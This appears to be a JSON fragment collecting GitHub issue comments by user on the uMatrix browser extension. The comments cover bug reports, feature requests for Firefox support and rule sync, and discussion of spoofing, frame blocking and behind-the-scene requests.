    "Nojevah": "For some sites, it's a nice feature; for others, you won't notice images/frames are blocked.\nBut I guess a simple setting is unavoidable (in \"blocked frame\" color; slide at maximum left ?).\nOr in filterset, replacing \"block\" by \"block+\" for block + hide. Like this you could hide only what you really don't want to see. But maybe it would over-complicate \u00b5Matrix.\n. Gorhill will surely implement the same function (\"hide all blocked frames\"); it seems really easy to implement. But I though it deserved a discussion on how it would be possible to hide \"per-case\". If someone comes with a nice idea...\n. http://pastebin.com/FcXkDmLa\n. These quirks indeed are not linked to \u00b5Matrix or my problem.\nMaybe it does not hang for you because you have a better processor.\nI can reproduce it each time, and 1 core is at max use. It will unfreeze after some seconds, but if you scroll down, it will freeze again.\n. 8 GB.\nIt is not the RAM limit which is reached. But 1 Core (on 4) is at max (25%).\nI either disable extension, or use incognito mode without extension to test. If I disable \u00b5Matrix from popup, it will still freeze (because \u00b5Matrix still lists/counts elements).\n. All latest loaded gif are not moving anymore. And if I scroll Up or down, nothing happens. If I try to close the tab (clicking on the \"close button\"), it will need several seconds before to close.\nBut computer does not freeze, I can even click on another tab in the same time.\n. When doing my tests (enable/disable \u00b5Matrix), I have closed and reopened the webpage each time.\nI guess \u00b5Matrix needs a bit of CPU/RAM, then it reaches the machine limit earlier than without \u00b5Matrix.\n. Oh you're right. If I block frames from \"assets.tumblr.com\", it does not freeze anymore.\n. I was quite sure I already asked for this (some years ago unfortunately) but I can't find it. I asked the same thing: a better placeholder (the one for chrome, which is used by uBlock) and a contextual menu to temporarily display image.\n. It's a request, and I think it is the right place to ask. If Edge extensions were to work nearly like Chrome/Firefox, it could be supported too. In the end, the main developer will choose what to do.\n. ",
    "ledti": "Ah, hrm.\nMaybe just assume overflow after a certain point? For example, add a caret or an asterisk on the left side of the domain name after 30 characters.\ndasdasd2313-huewn8ndas8231dja-asdasjdnajsnwqe.subdomain.domain.com\n*dnajsnwqe.subdomain.domain.com\nIs there a need to see the entire domain name in such cases?\n. ",
    "SergeiShir": "New user of uMatrix\nNoticed the same cosmetic issue\n\n. New user of uMatrix\nNoticed the same cosmetic issue\n\n. New user of uMatrix\nNoticed the same cosmetic issue\n\n. Hello.\nI started to suffer from the exact same issue after Chrome got updated to its latest version (63.0.3239.132 Official Build 64-bit) and uMatrix 1.2.0:\n1) My company's intranet web site displays garbled text in one frame (example: \u001f\ufffd\b\ufffdVmo\ufffd6\u0010\ufffd\ufffd_\ufffd\ufffd\ufffd\u001d\ufffd\ufffd\ufffdl\u0006G\ufffd\ufffdf\u0019\ufffd/]\u0426\ufffd\ufffda\u0018h)\n2) Many links on the company's intranet web site now misbehave:\nObject Moved - This object may be found\n3) Working in Incognito mode, or disabling the uMatrix extension resolves the issue\n4) I attached these files Files.zip:\nA) Chrome - Dev Tools - Incognito mode - frame without garbled text.png\nB) Chrome - Dev Tools - Usual and Incognito mode - raw HTML for the problematic frame.png\nC) Chrome - Dev Tools - Usual mode - frame with garbled text.png\nD) Chrome - Dev Tools log.txt\nE) uMatrix - logger.txt. ",
    "offhub": "Sorry my bad, setting it to another value and re-entering the zero fixed my problem.\n. Can you try after toggling uMatrix?\n1. Set value to zero\n2. Disable extension \n3. Enable extension\n4. Go to statistics tab\n. Chrome 39.0.2171.52 (64-bit)\n. Yes, from the extension page.\n. enable-fast-unload flag is enabled. But I can't remember exactly which flags I set.\n. I was about to upload a screen recording of the issue. :)\n. Sorry, i wasn't clear.\nWe can spoof user agent header with randomly selected string but navigator values stays unchanged. Shouldn't it also spoof the navigator values?\n. http://browserspy.dk/useragent.php\n. https://www.wilderssecurity.com/threads/ublock-a-lean-and-fast-blocker.365273/page-33#post-2476324\n. it's a Chromium API limitation.\n\nOnly one extension is allowed to redirect a request or modify a header at a time. If more than one extension attempts to modify the request, the most recently installed extension wins and all others are ignored. An extension is not notified if its instruction to modify or redirect has been ignored.\n\nhttps://developer.chrome.com/extensions/webRequest#conflict_resolution\n. Sadly no one has volunteered to translate AMO into Turkish.\nhttps://forums.mozilla.org/viewtopic.php?f=20&t=2802&sid=7881404224918db4050b57abea2b2dab\n. s3-eu-west-1.amazonaws.com is listed as a suffix in the Public Suffix List. It's not a subdomain!\n\nA public suffix is a set of DNS names or wildcards concatenated with dots. It represents the part of a domain name which is not under the control of the individual registrant.\n\nSee:\nhttps://github.com/gorhill/uMatrix/issues/54#issuecomment-62480877\nhttps://github.com/gorhill/uMatrix/issues/121#issuecomment-72319230\nhttps://github.com/gorhill/uMatrix/issues/155#issuecomment-93024880\n. ",
    "ghostwords": "Hey guys, Chameleon's author here. Regarding blending in to match Tor: There is only so much you can do to make Chrome look like Firefox. There might be more merit in (subtle/believable) randomization. Plain old blocking is best, when you know what to block. Please see ghostwords/chameleon#1 for the Chameleon discussion.\n. ",
    "jankkm": "I think it doesn't make sense to pretend using firefox in chrome because the order of the request header is different in both browsers. So if a website can tell you are a chromium user who changed his user agent etc. you are very much identifiable. Am I wrong?\nI found out about this on ip-check.info\n. Thank you I do know that. I just think it's much more convenient to have a blacklist for that. But then again if I'm the only one feeling that way there is no point reintegrating this.\n. I hate to bother you again since this seems to be an issue that does not interest you a lot but it still is a problem on that particular page and I think it should be solved.\nWhat I don't understand is why the web page waits for the (unwanted) scripts to load and thus waits forever. Is anyone able to explain that?\nOther ad blockers break that page as well probably for the same reason.\n. ",
    "eduardoeae": "No error is shown.\nI guess the problem is some settings of my side. I'll try to find it.\nPS: The domain is listed as \"com.ar\" in the dropdown. Which is not correct.\n. No errors there either.\n. The store.\nTried the 0.8.0.1 version from github and the same happens.\nBut only with MY config. Default settings works OK.\nHere is my config http://pastebin.com/mWbZMTH4\nNo. I didn't modified anything.\n. After disabling the extension and enabling it again, it works as expected...\n. Chrome/38.0.2125.111 in Archlinux 64 bits.\nFlags: \"--disk-cache-dir=/tmp/.chrome_cache --disk-cache-size=104857600 --media-cache-size=10485760 --enable-low-res-tiling --flag-switches-begin --enable-deferred-image-decoding --enable-download-resumption --enable-tcp-fastopen --enable-accelerated-overflow-scroll --ignore-gpu-blacklist --flag-switches-end\"\n. AutoScroll\nFeedly Background Tab \nHTTP Headers\nHTTPS Everywhere\nHumble New Tab Page\nMinimal Scrollbar\nProxy SwitchySharp\nURL Pinner\nVimium\nuBlock\nI will disable the auto-upload and see if problem appears again.\n. It only happens when a tab is opened at the browser start (\"Continue where you left off\" option).\nIf I close the tab, restart the browser then open the page, it works OK.\n. Actually, Chameleon extension do accomplish this. https://github.com/ghostwords/chameleon\n\nUser Agent from JavaScript Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0\n. Just to clarify, this did not happen before 0.9.1.3. Could it be related to the fix of #246 ?\n. Sorry. I forgot.\nUsing Firefox 40.0.3. I build the extension with your script in the tools folder in git.\nuBlock's sync works OK.\n. I love you!\nIt would be nice to have that preference shown by default in about:config though. But good enough for me.\n. \n",
    "darthvader41": "I am noticing this as well on certain sites. Example: https://www.youtube.com/watch?v=OMOVFvcNfvE\n\nIf I temporarily allow all frames, refresh, block all frames, then refresh, the option to allow or block 1st-party requests comes back up.\n\nHere are my rules, which differ from the default ones:\nhttps-strict: * true\nmatrix-off: chrome-extension-scheme true\nmatrix-off: chrome-scheme true\nmatrix-off: chromium-behind-the-scene true\nmatrix-off: localhost true\nmatrix-off: opera-scheme true\nreferrer-spoof: * true\n * * allow\n * frame block\n* * script block\nI am using uMatrix 0.8.1.4 on Firefox 37.0.2 for Linux 64-bit. Other extensions that I have installed are HTTPS Everywhere and uBlock Origin, and the error occurs regardless of whether or not they are disabled.\n. ",
    "hrj": "\nThe settings are not saved in the extension folder. The path has to be the same just so the browser knows it's the same extension.\n\nGotcha. That's what I suspected. This can perhaps be clarified in the wiki; it had me confused a little. Else, this issue can be closed.\nThanks!\n. Screen shot will require some juggling, but in the meanwhile, here's the relevant log entry:\n\nRefused to connect to 'wss://api.irccloud.com/websocket/1' because it violates the following Content Security Policy directive: \"default-src https: data: 'unsafe-inline' 'unsafe-eval'\". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.\n\nI hope that helps; otherwise I will upload the screenshot.\n. @gorhill After re-reading some more, I am confused. Isn't wss protocol the equivalent of https? Or is wss considered an insecure protocol in HSTS?\nSecondly, is the request being blocked in uMatrix or in the browser itself?\n. So, once you allow it in the CSP header, there won't be a way to block it through uMatrix? IOW, it will become a behind-the-scenes request?\n. Thanks. I do see some related entries in behind-the-scene matrix (which I just discovered).\nOn that matrix, filtering was disabled and all entries were faded green. Is this the default, or did I disable it (but have forgotten)?\n. Can you please list the important things? I am now blocking everything in the behind-the-scene-matrix and would like to know what I am breaking.\n. Thanks. So the list of important functionality affected by blocking B-T-S requests seems to be:\n- Requests made by extensions\n- Requests made by browser to install or update extensions\nCan that be called a complete list of known important uses?\n. Ah ok, thanks. I am not using uBlock; only uMatrix.\n. I can see how it would be confusing and an overload of information. But IMO not making it discoverable defeats the purpose of the extension; it leads the user to believe that requests are being blocked when they are not.\nCould an intermediate solution be possible: a count of behind the scene requests is shown on the per-tab matrix. Clicking this brings up the behind-the-scenes matrix, or a message that explains B-T-S and then allows the user to proceed to the B-T-S matrix.\nPS: I fixed a typo in my first comment, I had meant to write: \"not easily discoverable\" but had omitted the not\n. That screenshot talks about b-t-s requests, not the b-t-s matrix AFAICT.\nI am a fan of uMatrix. I have helped install this extension on many of my friends' computers. As a long time user, I am just expressing my opinion. Am not trying to exaggerate.\n. Previous discussions #590 and #263 . > And when one allows other, this allows much more than just media resources.\nHow about having more columns? One each for image, media, websockets and others.\n/no-sarcasm-intended. ",
    "qwicfingers": "I had not edited the rules (My Rules) beyond changing stuff in the matrix window, but  * * doc allow did not exist... Adding it fixed the issue. thanks.\n. ",
    "arcaneAgilmente": "If I remember right, syncing isn't possible due to the limited amount of space google gives extensions to sync data. That's what the export/import functions are for.\n. We can?\nSo currently GitHub is showing three site requests, say I want to see what they are and to allow/disallow specific ones to go through. How would I go about doing that?\n. ",
    "ctcherry": "If possible I would really like this as feature well!\n. ",
    "busybeaver": "The feature would really simplify the usage of uMatrix on multiple devices (in my case 3)...\n. ",
    "d-kr": "Is it possible to encrypt (or hash) the filter or host names? Because ...ehm ... lets say I'm not \"proud\" of some of my rules.\n. @softwarestake : Just google for unshortener or untinyer. I found at least four chrome extension who selfclaim that they can bypass many url shortener. (But I did not test any on those)\n. (I'm just a user, but:) I think that the functions should move (including spoof-agent) in an extra extension, because the whole navigator object tells much more about the browser:\n- .userAgent returns the user agent too,\n-  .plugins returns a list of all installed plugins\n-  .appVersion, .appCodeName, .appName, .product, .vendor and many more parts of the user agent\nand uMatrix is for me \"just\" for CSP based filtering.\nEdit: Wording\n. Do you have any privacy settings enabled? Like \"Predict network actions ...\"\n etc?\n. This will not work, because you need to break, intercept SSL connections.\n1. Google, Facebook, Microsoft and some others use Certificate pinning or enforce only special root certificates for their own domains.If you browse https://google.com and the certificate is not signed be Google / on the white list, which for Chrome you cannot change,Chrome will not only complain, but also call home. (Remember the story of the eqypt CA which intercepted internally SSL connections and resulting in removing Chinas CA from the trusted set)\n2. RFC 6797 defines HTTP Strict Transport Security, which enabled every Webserver request certificate pinning. So before using \"uMatrixProxy\" you need to clear that cache or the browser will complain.\n3.  Local apps who use internet to update, communicate or call home. The proxy cannot see the origin (update routine in normal program or web browser) and needs to break SSL to see the exact request which (if the program was developed with security in mind) will notice it.\n4. Security and Cryptography are both very complex, difficult to understand and hard to master, so any bug in the proxy gifts the attacker MITM proxy which the client trusts. (Worst case)\nEdit: Added formatting and 4. point.\n. Well, on twitter links (t.co) it has the same effect. For example: https://t.co/8mTCHSo3uQ . If there is no javascript enabled, then that page is blank because neither <meta ...inside <noscript> nor <script ... will be executed. ( view-source:t.co/8mTCHSo3uQ )\n. duplicate of #118 \n. Duplicate #271, #118\n. The issues are not only about the user agent but also about window.navigator itself (including plugins).\nIn both cases uMatrix \"fails\" / \"does not try\" / \"is not meant\" to hide that personal information other than some fields.\ngorhill's second answer in 271 already talks about fingerprinting,the navigator object in general and why he does not extend the spoofing much futher. I assumed it applies here too.\nMaybe you are right that there are not duplicates, but they have the same cause.\n\nI would suggest that you actually read issues before declaring them duplicates.\n\nI commented in them.\n. Already discussed a few times:\n271\nwith the same website to play with around.\n. ~~According to the spec there is one way they could do it: https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects.~~\n~~In short when they redirect(http response code 301) cross origin then csp ignores them :/ .~~\nOn second thought, this applies only for path extension. So meh.\n. My chrome console says: \"SVG's SMIL animations (, , etc.) are deprecated and will be removed. Please use CSS animations or Web animations instead.\" ~~Maybe we just have to wait a few releases?~~\n. On the left side of the popup click on the blue region with the url and select '*' like in this wiki page https://github.com/gorhill/uMatrix/wiki/Very-bare-walkthrough-for-first-time-users.\n. ",
    "acidicX": "I would love to have this on Firefox as well!\n. imho RequestPolicyContinued works quite well (I don't know if it support syncing out of the box though?), but uMatrix has a nicer interface and allows finer control... \n. Any special reason why? I think this was a very essential feature. I always forget to click on the reload button. It is just so much easier to leave it on automatic reload...\n. ",
    "tYYGH": "I'd be interested as well.\nI'm curently using \"RequestPolicy Sync\", but since RequestPolicy is not an option anymore on Firefox 38, I'm going to switch to whichever extension is going to support FF sync first: either RequestPolicyContinued, or uMatrix\u2026\n. @gorhill Thank your for providing the dev build.\nI've been using it for a week on one Firefox, and it worked perfectly, including pushing to my Sync server, I suppose (no visible error).\nHowever, this week-end, I tried installing it on another Firefox, and I could not find how to retrieve the cloud-stored rules\u2026 After cloud is enabled, I see the new button to push the rules to the Sync server, but there is no button to retrieve the rules from the server; I suppose this button would appear after having pushed the rules to the server at least once, but then my previously-sync'ed rules would get overwritten!\nWhat did I do wrong?\n. I see. So let's assume that I copy my rules to a text file, and manually set the rules to those in this text file each time I install uMatrix on a new Firefox, and upload again the (same) rules in order to bootstrap the sync process on each new Firefox profile.\nWill the rules thereafter actually sync between the different Firefox'es, even though the UI only shows the \"up\" button at first, and not the \"down\" button?\n. @gorhill: I did as I said, and I got the result you said :-)\nAs far as I'm concerned, the issue is solved for Firefox, even though automatic sync would be a nice option (hint :-p )\nThank you gorhill for this excellent release!\n. Hi, you were right to close this. I did some additional tests (among those are disabling uMatrix and reverting to some better known extensions combinations), and it seems to be rather some altered behaviour since Firefox 38.\nSo it is unrelated to uMatrix after all. My apologies for not testing this before. Keep up the good work. I find uMatrix much more enjoyable to use than requestpolicy!\n. ",
    "ivelichko": "It would be really great to have this sync feature.\n. ",
    "tiagoad": "I think this feature is essential for anyone who uses more than a single computer daily.\n. ",
    "griels": "+1.\n. ",
    "eFiggy": "Yes, a sync feature would be wonderful! I'm on different computers all the time and it would be nice to not have to keep white/blacklisting items I've already configured elsewhere. Thanks for this great extension!\n. ",
    "lkraav": "This would also be great from a company management perspective, where a set of computers could get the base rules from a central repository, and always stay up to date.\n. ",
    "adrienbeau": "Firefox stores extension data in a binary SQLite database file. For example under Linux: $HOME/.mozilla/firefox/xxxxxxxx.default/extension-data/umatrix.sqlite\nChrome also stores extension data in a binary SQLite database file. For example under Windows:\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Xxxxxxx\\Local Storage\\chrome-extension_ogfcmafjalglgifnmanfmnieipoejdcf_0.localstorage (there is also a matching .localstorage-journal file).\nI'm not sure you can copy the binary files between different operating systems and architectures (32-bit / 64-bit). If you use exactly the same software (OS and browser) on both sides, it could work, provided the browsers on both sides are turned off when you copy the file.\nMaybe you could use SQLite database tools to dump the data from one side, and inject it in the other side. Chrome and Firefox use a different table structure for the extension data, so you would need additional conversion.\n. I have seen this too, especially using the Google search engine (but maybe this is because I use it a lot).\n- Browser: Firefox 39.0 (Mozilla Firefox for Ubuntu - Canonical - 1.0)\n- uMatrix: v0.9.2.1\nHere's how I can reproduce it fairly well:\n- Go to http://www.google.fr/\n- Search for \"adrien beau free fr\"\n- One of the search results is for http://adrien.beau.free.fr/ (a very simple pure HTML page, no Javascript, no cookies)\n- Wait a bit in case Google has requests running in the background\n- Middle-click on the search result to open it in a new tab\n- In the uMatrix log, you can see two requests for my web site (the page, and one image), 10 google.fr cookies, and one google.fr script (all of them blocked by uMatrix)\n- In the page matrix, google.fr and www.google.fr are listed even though nothing in the page refers to them\nHere a screenshot of the page matrix:\n\nAnd here's a big screenshot of the uMatrix log resulting from this test (most relevant lines at the top):\n\n. Thanks for the link, I didn't know about it.\nI know about the Google search redirection, and it can actually be seen in the screenshot. The second gray bar from the top is when I middle-clicked to open in a new tab (at 13:25:26, more than one minute after displaying the search results). We can see Google set some cookies at that point, and then redirected to my site. uMatrix is apparently able to decide it is a new site, since it displays a grey bar for it. Maybe some Google requests were still lingering at that point, I'm not up-to-date with what concurrent events can happen with Javascript these days.\nI understand it is not easy to decide when the requests are \"coming from a new site\", or \"still issued by the current site\"; maybe a good FAQ is the best solution to this issue.\n. I think it is both concise and accurate. I suppose the tooltip for the eraser icon (\"revert temporary changes ...\") needs updating too? I haven't tested it.\n. @gorhill Do you have plans to have uMatrix run on Android at a later time?\n. > We are asking for advice.\nAdvice is not easily given, and easily misleading. Giving proper advice takes a lot of time.\n\nYou have four blocking projects\n\nAs far as I know, there are only two actively maintained: uBlock (the most popular by far) and uMatrix.\n\n(lots of questions about lots of extensions)\n\nI think you should find a forum where such topics are discussed among enthusiasts, and ask there. This tracker is to report issues in uMatrix.\n\nis it redundant to install uBlock if I have uMatrix?\n\nuMatrix blocks and alters outgoing HTTP requests, while uBlock blocks and alters individual elements in web pages. Both can block requests to a blacklisted host, so they are redundant in that case. uBlock can do more (block individual elements in a page), so that part is not redundant. Maybe uMatrix also has a few features that uBlock doesn't have? I don't use uBlock so I don't know.\nIt seems to me uBlock is more end-user friendly (just enable big filter lists, and be protected), while uMatrix is more of a \"do-it-yourself\" extension (I have actually removed all uMatrix blacklists, and created a small one of my own). It is also likely that uBlock consumes more resources (RAM, CPU) than uMatrix, but I don't know it is an issue in practice, especially compared to AdBlock and the like, which are notorious resources hogs.\nYou mentioned your Mom having difficulty with NoScript. Don't install uMatrix for her.\n. >  Is there a way?\nNo. uMatrix works at the domain-level.\n. No problem using Firefox 44.0.2 and uMatrix 0.9.3.2. Your link displays the Microsoft page.\nI already had a one Microsoft rule: microsoft.com aspnetcdn.com * allow\nAlso collector.githubapp.com and googleanalytics.com were on my blacklist.\n. So, with the option you propose, if a domain was allowed, in the matrix, only the top-level domain would be green, all its subdomains would appear red until you clicked them. Also, if you had a list of a domain and subdomains all green, clicking on the domain would turn it red, but all subdomains would remain green.\nThis would mean that when uMatrix encounters a subdomain for which there is no configuration, it would not look up the domain hierarchy, but simply block it. This would also mean you have to create a lot more rules, because each subdomain you want to enable now has to be explicitly listed. I agree this can be seen as \"more secure\".\nInteresting idea.\n. Unable to reproduce.\nUsing Firefox 50.0, uMatrix 0.9.3.6, and my current ruleset (nothing fancy, except I use a very small list of blacklisted hosts), the popup loads on the first try. Here's the matrix for the fiber.google.com page:\n\nAnd here's the matrix for the livechatinc.com page:\n. > It is possible that my browser being Chrome may make a difference\nOf course, this is why users are asked to provide their uMatrix version and their browser version when they report issues.\n\nWhen the popup loads, even though I disabled matrix filtering for the scope, the popup's content doesn't load\n\nThe popup is an entirely different web page, on a different web domain, so the rules are entirely separate from the rules on the page that launches the popup. You disabled matrix filtering for the google.com scope (scope is shown in the top-left blue cell), this has no effect on the livechatinc.com scope. As can be seen in your second screenshot, matrix filtering is not disabled for that scope (and it is blocking scripts from cdn.livechatinc.com in that scope).\n\nThe additional sources that the popup needs to load from are not shown on the original page where it loaded from\n\nOf course, since they are different pages on different domains. The matrix only shows requests that were launched from the currently displayed page, for the currently displayed scope. Once the popup opens, the requests are managed from that popup, not from the original page.\n\nso there is no way to enable them without loading the url in a different tab and then changing them there\n\nThat is indeed a good way to troubleshoot popup issues. A popup is nothing but a normal web page, shown in a separate window.\n\n(Would a custom ruleset fix this?)\n\nThis is actually what you do when you click the \"lock\" icon. It persists your matrix settings, in effect it becomes a custom ruleset for the scope.\nYour issue, I believe, is the red \"cdn.livechatinc.com\" line in your second screenshot (for the livechatinc.com scope). What you have requested is that all content from cdn.livechatinc.com is blocked, in your screenshot we can see one script has been blocked. Probably the script that displays the whole page/popup... Click on the line so that it becomes green, and reload the popup.. ",
    "privatebob": "Strict HTTPS doesn't seem to be blocking http links in the src of HTML5  tags.\nExample: \nhttps://www.dailymotion.com/video/x2fzmkz_game-of-thrones-season-4-making-of_shortfilms\nIn network monitor:\nPath: http://proxy-04.nyc.dailymotion.com/video/918/887/147788819_mp4_h264_aac_2.mp4?\nauth=1232432434-5675-9dfsdwen-345jlkjsdf9f7lswer080lkjljsdf6zxcyvt45b\nMethod: GET\nStatus: 206 Partial Content\nScheme: http\nType: video/mp4\nInitiator: Other\n(Edit: Strict HTTPS also doesn't block http requests by the flash player in an https page. It would probably be good to warn users of that fact in the help text.)\n. ",
    "myshen": "@CODYQX4 Open the \"per scope switch\" menu and turn off \"Referer spoofing\". That removes the conflict with Referer Control. Don't forget to save changes to the scope!\n. Sounds like a good solution for a more general problem. I think that it's possible to disable referrer spoofing only on specific sites, e.g.\nreferrer-spoof: wsj.com false\nso I thought that might help with specific sites like TypeKit.\n. ",
    "Tasqa": "I'm terribly sorry. I did't pay enough attention to the description. I was still under the impression that the textbox was for cosmetic (element) filters like in HTTPSB.\nBut the entries in the added hostfiles contain element blocking rules and now uMatrix blocks the entire site instead of just some elements.\n. I've noticed this feature of blocking WebRTC ip leakage is already present in uBlock0. Is progress on uMatrix on hold? \n. ",
    "cybershambles": "Thanks for that. I missed it.\n. ",
    "gavin20": "Nope - unchecked\n. Gotcha - here's what I see though. Looks like it's missing mail.google.com & googleusercontent.com. These connections are accessed via homepage extension(ANTP widgets - rss feed/meta tiles/gmail).\n\n\n. I do see some behind-the-scene requests, but not all of them. Example - I show the following url_requests occur in 'chrome://net-internals/#events' when I first launch Chrome. My expectation would be to see the following entries in uMatrix's Statistic page -\nhttps://mail.google.com/mail/u/0/feed/atom?nocache\nhttp://127.0.0.1/?osname=win\nhttps://clients2.google.com/service/update2\nI do recall these entries being visible in earlier uMatrix builds in the statistics page, including HTTP Switchboard. I also redirect Chrome variations server url to 127.0.0.1, which I used to see in the statistics page, enabled via flag \"--variations-server-url=http://127.0.0.1\".\n. ",
    "q0LoCo": "That's great news. I plan to work on e10s support, but i'm busy these days. last time i try it, firefox sdk does not ready for e10s. i will stop develop my demo.\nI use privacybadger as totorial, it contain an example for contentpolicy implement, also has useful util funcs. But that may not works under e10s.\n. ",
    "lewisje": "Policeman also looks like an extension of this type.\n. He did it with uBlock, so at least there's the consistency argument.\n. I'm thinking that the problem is that the browser APIs that uMatrix relies on only intercept HTTP(S) connections, and this is known to be a serious issue with WebSocket (WS) connections in uBlock: https://github.com/gorhill/uBlock/issues/1497\n. ",
    "DomT4": "This would be great. I use uBlock on Firefox, but I'm loving the fine-grained control I get from uMatrix in Chromium.\n. ",
    "vv0909": "uMatrix is great, definitely looking forward to the Firefox version. \n. ",
    "asymmetric": ":+1: , I love uMatrix's interface and fine-grained control capabilities. It's so much better than RP!\n. @gorhill : amazing work on the new FF addon. One thing: can we use a GH \"firefox\" label instead of having \"Firefox\" in the title?\n. ",
    "vdcbb": "Yes, please bring uMatrix to Firefox. I can't wait.\nI considered switching to Chrome just for this app, but I strongly prefer Firefox. So I will hope uMatrix will come to Firefox. And please do include a keyboard shortcut in Firefox for opening the uMatrix popup.\nThis is one of the coolest apps. Thanks for creating it.\n. Oh man. I saw these shortcuts before posting but the top one was greyed out and I didn't realize I had to create my own. Sorry!\n. But if uMatrix is ported to Firefox, can you keep the keyboard shortcuts in mind? I haven't been able to find Keyboard Shortcuts for the uBlock port of Firefox.\n. @quinncomendant: you can set a keyboard shortcut to open uMatrix if you are using Google Chrome. This will open the matrix whenever the keyboard shortcut is tapped. Far as I know though, there is no way to set a keyboard shortcut in Firefox :-(\n. which involves installing a whole other extension, just to filter one or two sites.\n. Yes, the Logger shows https://duckduckgo.com/post2.html but I don't know what that is/means. Is there a way to see/identify where the Frame is on the page to try to understand its purpose?\n. This was always one of the first things I disabled in NoScript. Drives me nuts when simply moving your mouse over something starts causing popups on the screen. The current state of websites often leaves me unable to read content because where ever I move my mouse something is popping open.\nIf one click is too much effort for you (and you use Chrome), you can assign a keyboard shortcut to open the matrix. You can find the option at the bottom of the extensions page. Unfortunately, there is no keyboard shortcut option in Firefox.\n. This is on purpose. See here: http://www.wilderssecurity.com/threads/umatrix-the-http-switchboard-successor.369601/page-15#post-2489046\n. Well, I don't quite follow you because if some blocked element on the page is blocking the content, then why am I able to get the content to appear by simply cycling F11? Cycling F11 does not change the on/off status of any of the uMatrix controlled elements on the page. Stated another way: if I assume that whatever else is still blocked on the page is causing the issue, then nothing should change (i.e., the content should stay hidden) absent my enabling the stuff that is still blocked on the page. Yet this is not the case.\nI have all eight \"Privacy\" settings (e.g., Delete Blocked Cookies, etc) disabled. \nIf I'm missing something, I apologize. I greatly appreciate your apps and only want to bring this to your attention if it's something you have time/interest in looking at. If not, then no problem.\n. Going from blocking almost everything to disable completely uMatrix without checking anything in between and conclude that there is something wrong with uMatrix is not a good way to use uMatrix, it's essentially putting the burden on me to figure whatever mix of rules unbreaks the page.\nIn my own defense this is not what I did. The fact that the window was blocked (by blocked elements) and then made to appear without allowing any additional elements is what lead me to believe they might be something amiss in the handling. But it was not a case of me just seeing that something didn't work and reporting that fact here.\n. ",
    "hackel": "Just an FYI--I finally disabled Request Policy once and for all.  \u00b5Block's advanced mode with dynamic filtering seems to cover everything I need.  While a \u00b5Matrix port will be nice when it's ready, make sure you check out how awesome \u00b5Block already is!\n(sorry for the notification spam)\n. @githubdbes1 Really don't appreciate the notification spam.  Please don't abuse Github issues.\n. ",
    "asherdavidson": "I agree with much of what you said, but the advantage that uMatrix has over Policeman is that it's much more user friendly. I could block and unblock connections in seconds with uMatrix, while doing the equivalent in Policeman is a pain in the ass.\nI would be willing to pay for uMatrix if you ported it to firefox. It's the only plugin that I miss since I ditched chrome.\n. Oh, that's pretty great! I didn't realize that's what you meant.\n. Awesome! It's working great so far! :)\n. Let me clarify. I don't know exactly what script is running, all I know is that it only works when the whole addon is disabled. I checked the logs and the network tab, and I can't see any difference between the scripts loaded when uMatrix is enabled and when it's not. I don't know why uMatrix is doing this, and perhaps I was too quick to assume it was blocking a script, but I do know that it is the root of the problem.\n. It wasn't enabled to begin with. I use HTTPS Everywhere for that.\nOn Fri, May 8, 2015 at 7:01 PM, Raymond Hill notifications@github.com\nwrote:\n\nDid you try to disable Strict HTTPS? This switch is independent of the\nmatrix switch.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/175#issuecomment-100390706.\n\n\n-Asher\n. I figured out the problem. I had the User Agent spoofing enabled, and it\ndidn't like that. I don't know why, but that fixed it. Thanks!\nOn Fri, May 8, 2015 at 7:02 PM, Asher Davidson usherdavidson@gmail.com\nwrote:\n\nIt wasn't enabled to begin with. I use HTTPS Everywhere for that.\nOn Fri, May 8, 2015 at 7:01 PM, Raymond Hill notifications@github.com\nwrote:\n\nDid you try to disable Strict HTTPS? This switch is independent of the\nmatrix switch.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/175#issuecomment-100390706.\n\n\n-Asher\n\n\n-Asher\n. https://www.google.com/calendar/render\nOn Fri, May 8, 2015 at 7:04 PM, Raymond Hill notifications@github.com\nwrote:\n\nCan you give me a URL please so that I have an idea what to look at.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/175#issuecomment-100391025.\n\n\n-Asher\n. ",
    "benoit-pierre": "\nI agree with much of what you said, but the advantage that uMatrix has over Policeman is that it's much more user friendly. I could block and unblock connections in seconds with uMatrix, while doing the equivalent in Policeman is a pain in the ass.\n\nThis. The number of clicks needed to do anything with Policeman is much higher. Plus the latest version of Policeman is really buggy.\n. This is normal, see the help text for the Delete blocked cookies option:\n\nBlacklisted cookies are not prevented by uMatrix from entering your browser. However they are prevented from leaving your browser, which is what really matters. Not blocking cookies before they enter your browser gives you the opportunity to be informed that a site tried to use cookies, and furthermore to inspect their contents if you wish.\n. How about you stop spamming the tracker and read the actual documentation?\n. A better solution if you want light text on a dark background then using the Firefox settings is this add-on: Dark Background and Light Text.. Dupplicate of #155: avatars0.githubusercontent.com is a root domain.. \n",
    "Faberman": "Thank you for your work. I'm also waiting for uMatrix for Firefox.\nPoliceman is not an option. I've tried Policeman and its interface is awful: click here, click there, than click here again, etc. Also uMatrix has additional options for more privacy. And of course uMatrix has its killer feature - a genius matrix-style user interface, simple and powerful. I have been using NoScript+RequestPolicy for years, but I'll definitely replace those addons with uMatrix.\n. ",
    "Zement": "Fantastic work. Thank you!\nI would also love to see \u00b5Matrix for Firefox. :)\n. ",
    "josegl": "great work, I am waiting a firefox port too. policeman is a good alternative, but umatrix is much more userfriendly and requires less clicks to achieve your target. \n. ",
